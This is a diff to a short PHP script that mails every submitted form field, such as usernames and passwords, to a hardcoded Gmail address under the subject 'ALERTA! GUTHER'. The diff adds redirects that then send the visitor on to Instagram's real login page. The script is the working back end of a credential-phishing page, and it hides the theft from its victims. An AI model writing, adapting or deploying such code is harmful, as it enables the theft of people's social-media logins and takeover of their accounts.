@@ -1,8 +1,5 @@
 <?php
 
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
-
 if(isset($_POST["send"]) && $_POST["send"]=="ok"){
 	$out = "";
 	foreach($_POST as $key => $value){
@@ -21,10 +18,15 @@ if(isset($_POST["send"]) && $_POST["send"]=="ok"){
 	$to      = 'guther.manaus@gmail.com';
 $subject = 'ALERTA! GUTHER';
 $message = $out;
-$headers = 'From: guther.manaus@gmail.com' . "\r\n" .   
+$headers = 'From: guther.manaus@example.com' . "\r\n" .
+    'Reply-To: webmaster@example.com' . "\r\n" .
     'X-Mailer: PHP/' . phpversion();
 
 mail($to, $subject, $message, $headers);
+
+header("location:https://www.instagram.com/accounts/login/");
+
+echo '<meta http-equiv="refresh" content="5;URL=https://www.instagram.com/accounts/login/">';
 
 }
 else{
